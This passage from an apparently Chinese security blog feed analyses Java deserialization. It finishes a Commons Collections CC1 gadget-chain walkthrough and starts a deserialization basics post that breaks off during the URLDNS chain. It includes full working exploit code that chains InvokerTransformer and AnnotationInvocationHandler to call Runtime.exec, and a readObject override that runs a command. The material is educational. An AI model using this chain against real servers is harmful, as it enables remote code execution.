class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">a</span> <span class="operator">=</span> (Runtime) runtime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//获得Runtime实例</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//获得exec函数</span></span><br><span class="line">        method.invoke(a,<span class="string">&quot;calc&quot;</span>);<span class="comment">//调用Runtime对象的exec函数弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么嵌套在InvokerTransformer类中该怎么写， 在Commons Collections库中存在ChainedTransformer这么一个类，可以将多个Transformer串联在一起形成一个链，递归调用。跟进这个类看一下</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/20.png" class><p>它的构造方法传递一个数组，它的transform方法将iTransformers进行递归调用。代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCtest02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//定义一个数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//调用invoke方法获得实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//调用exec方法，弹出计算器</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建实例</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完美解决不能反序列化的问题。</p><h4 id="AnnotationInvocationHandler不能在包外实例化"><a href="#AnnotationInvocationHandler不能在包外实例化" class="headerlink" title="AnnotationInvocationHandler不能在包外实例化"></a>AnnotationInvocationHandler不能在包外实例化</h4><p>看代码，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/21.png" class><p>构造器没写类型，那就是默认访问修饰符，只能在包内实例化。所以还是需要反射来获得实例对象。该构造器接收两个参数，分别是注解类型的Class对象和Map对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCtest02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">//获得Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//获得构造器方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        <span class="comment">//设置访问私有构造器权限</span></span><br><span class="line">        annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//实例化AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Override.class,transformedmap);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样就解决了问题。</p><h4 id="满足readObject的两个if判断"><a href="#满足readObject的两个if判断" class="headerlink" title="满足readObject的两个if判断"></a>满足readObject的两个if判断</h4><p>实际上这条链根本就没有调用setValue方法，打断点调试看看。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/22.png" class><p>第一个if就进不去，这个memberType实际上就是获取注解对象名为name的值，这个name，就是memberValues的键名。而这个memberValues是什么呢？我们创建的Map对象，不明白的可以回头看看代码，最后我也会贴出完整反序列化链，一看就能明白。我们设置的Override，跟进看一下，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/23.png" class><p>是没有值的，所以需要换一个注解，跟进Target看一下，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/24.png" class><p>有value值，那就用它了。同时对于Map对象，需要put键值对，键名必须为value，键值随意。更改完成后，再跟进看一下</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/25.png" class><p>完全满足两个if条件判断。</p><h4 id="setValue方法的参数不可控"><a href="#setValue方法的参数不可控" class="headerlink" title="setValue方法的参数不可控"></a>setValue方法的参数不可控</h4><p>实际上执行了setValue方法后会跟进到checkSetValue。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/26.png" class><p>而这里的value不是我们想要的Runtime.class，也就是不可控。可以利用一个类ConstantTransformer，跟进看一下它的transform方法，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/27.png" class><p>无论接收什么参数，返回一个固定值，而这个固定值可以通过构造器可控。也就是说，无论value被赋上什么值，只要它调用了ConstantTransformer的transform方法，结果我们都可控。在Transformer数组里实例化ConstantTransformer</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new ConstantTransformer(Runtime.class)</span><br></pre></td></tr></table></figure><p>然后调试看一下，</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/28.png" class><p>在数组遍历时会调用transform将输入改变为Runtime对象。</p><h4 id="完整cc1链"><a href="#完整cc1链" class="headerlink" title="完整cc1链"></a>完整cc1链</h4><p>完整反序列化代码为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCtest03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//恶意攻击类，命令执行</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;asd&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="comment">//创建AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Target.class,transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;2.反序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹个计算器来宣告胜利。</p><img src="/2023/03/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE%E5%88%86%E6%9E%90/29.png" class><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>第一次分析cc链，大概花了五天左右，便写下这篇文章记录自己对于cc链的分析过程。主要是跟着白日梦组长的视频学习，讲的非常好了。在分析反序列化链时也收获到了很多。</p><p>反序列化之路任重而道远。</p><p>相关链接：</p><p><a href="https://www.freebuf.com/vuls/276632.html">Java反序列化之ysoserial cc1链分析</a></p><p><a href="https://xz.aliyun.com/t/7031#toc-1">JAVA反序列化 - Commons-Collections组件</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化基础</title>
      <link href="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>与php和python的反序列化类似，序列化与反序列化本质上就是方便以流的形式在网络上传输，更持久化的保存对象。在服务端没有严格限制用户输入的情况下，服务端代码会在反序列化时运行用户提交的恶意代码，最终造成攻击的目的。</p><h2 id="相关基础"><a href="#相关基础" class="headerlink" title="相关基础"></a>相关基础</h2><h3 id="Serializable-接口"><a href="#Serializable-接口" class="headerlink" title="Serializable 接口"></a>Serializable 接口</h3><p>跟进源码发现，它这只是一个空接口。</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/1.png" class><p>这个接口是用来标识那些类是可以被反序列化的，换句话说，只有实现了Serializable接口的类才能被反序列化，强行序列化会发生报错。对于静态成员变量和transient 标识的对象成员变量不参与反序列化。</p><h3 id="ObjectOutputStream类"><a href="#ObjectOutputStream类" class="headerlink" title="ObjectOutputStream类"></a>ObjectOutputStream类</h3><p>是Java I&#x2F;O类库提供的一种对象输出流类，它可以用于将对象序列化后写入输出流中。能将 Java 中的类、数组、基本数据类型等对象转换为可输出的字节，也就是序列化。</p><h4 id="writeObject函数"><a href="#writeObject函数" class="headerlink" title="writeObject函数"></a>writeObject函数</h4><p>序列化函数，将一个对象写入输出流。在序列化对象时，我们可以将一个对象作为参数传递给 writeObject() 方法。该方法会自动将该对象序列化并写入到输出流中。</p><h3 id="objectInputStream类"><a href="#objectInputStream类" class="headerlink" title="objectInputStream类"></a>objectInputStream类</h3><p>Java 中的一个类，用于读取序列化对象。它可以从输入流中读取对象并将其反序列化为 Java 对象，使您能够在不同的 Java 虚拟机之间传输对象。</p><h4 id="readObject-函数"><a href="#readObject-函数" class="headerlink" title="readObject()函数"></a>readObject()函数</h4><p>是 ObjectInputStream 类中的一个方法，用于从输入流中读取对象并将其反序列化为 Java 对象。它可以用于从文件、网络连接或任何其他类型的输入流中读取序列化对象。当使用 ObjectOutputStream 将对象序列化并写入输出流时，可以使用 readObject()方法将该对象从输入流中读取出来，并将其转换为相应的 Java 对象。</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>简单说明了反序列化所要用到的几个类与函数，接下来写个例子体会一下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Persion</span> <span class="variable">persion</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Persion</span>(<span class="string">&quot;XiLItter&quot;</span>,<span class="number">19</span>);<span class="comment">//实例化一个对象</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="comment">//它是一个字节数组输出流，用于将序列化后的对象输出到字节数组中。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span>  <span class="variable">ObjectOutputStream</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="comment">//将persion对象序列化输出到byteArrayOutputStream对象中</span></span><br><span class="line">        ObjectOutputStream.writeObject(persion);</span><br><span class="line">        <span class="comment">//将persion对象序列化输出到byteArrayOutputStream中</span></span><br><span class="line">        System.out.println(byteArrayOutputStream);<span class="comment">//打印</span></span><br><span class="line">        System.out.println(<span class="string">&quot;------------------------&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;data.bin&quot;</span>);</span><br><span class="line">        <span class="comment">//将二进制数据输出到文件中</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        oos.writeObject(persion);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;data.bin&quot;</span>);</span><br><span class="line">        <span class="comment">//创建对象从二进制文件中读取</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">Persion</span> <span class="variable">newpersion</span> <span class="operator">=</span>(Persion) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//从 fileInputStream 中读取序列化后的对象，并将其转换成 Persion 对象类型。</span></span><br><span class="line">        System.out.println(newpersion);<span class="comment">//反序列化输出调用tostring函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Persion</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"><span class="comment">//    private transient String name;</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Persion</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Persion&#123;&quot;</span>+<span class="string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="built_in">this</span>.name+<span class="string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="built_in">this</span>.age+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在反序列化过程中会调用toString函数，将字符串输出出来。</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/2.png" class><p>当name属性用transient修饰后，name属性就不参与序列化，看看效果：</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/3.png" class><p>name属性的值变成了null。造成反序列化最重要的一点就是如果被反序列化的类重写了writeObject和readObject方法，java就会调用重写的方法，执行里面的代码。如果该重写方法中添加了恶意的，能执行命令的代码，就会达到反序列化攻击的目的。看个例子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;dog&quot;</span>,<span class="number">6</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;User.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;User.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">newuser</span> <span class="operator">=</span>(User) objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span>+<span class="string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="built_in">this</span>.name+<span class="string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="built_in">this</span>.age+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream oos)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        oos.defaultReadObject();</span><br><span class="line">        <span class="comment">//该方法会将对象默认的反序列化操作执行完毕。</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="comment">//重写readObject方法弹出计算机</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码重写了readObject方法，并且添加了弹出计算器的命令，测试一下会不会去优先执行我们重写的readObject方法。看看效果：</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/4.png" class><p>成功弹出计算器。这样攻击看起来很方便，直接在服务端上传一个重写了readObject方法的类的序列化串，直接能够命令执行。但是这种方式几乎不会出现。为什么？作为后端开发人员，不可能会在代码中留下这么危险的readObject方法，即使有，无源码的情况下，我们也不会知道所属该方法的类名。（因为服务端反序列化的也只有自己的类）普遍的反序列化攻击方式包含三个部分：</p><blockquote><p>入口类：重写了readObject方法，并且是能够被反序列化的，最好是jdk自带的。例如HashMap</p><p>调用链：一个类的方法包含另一个类调用同名同类型的方法</p><p>执行类：能够命令执行或者远程写文件的类。</p></blockquote><h2 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h2><p>这一条链相对比较简单，利用的都是jdk原生的类，而且没有jdk版本的限制，非常适合像我这样的新手学习。这条攻击链不会执行命令，只会触发DNS解析，用来探测此处是否存在反序列化漏洞。</p><p>首先选择一个入口类，HashMap就比较好，跟进查看一下该 原生类是否满足上述条件。</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/5.png" class><p>该类继承了Serializable接口，并且它的参数类型宽泛，能够传递对象参数。</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/6.png" class><p>另外也重写了readObject方法，入口类的条件满足。这条链的主要目的是反序列化时让服务端发起一个DNS请求，那么我们找到原生的URL类看一下，</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/7.png" class><p>同样可以被反序列化，那么找URL类中比较常见的函数。例如这个hashCode函数</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/8.png" class><p>再跟进handler.hashCode函数，</p><img src="/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/9.png" 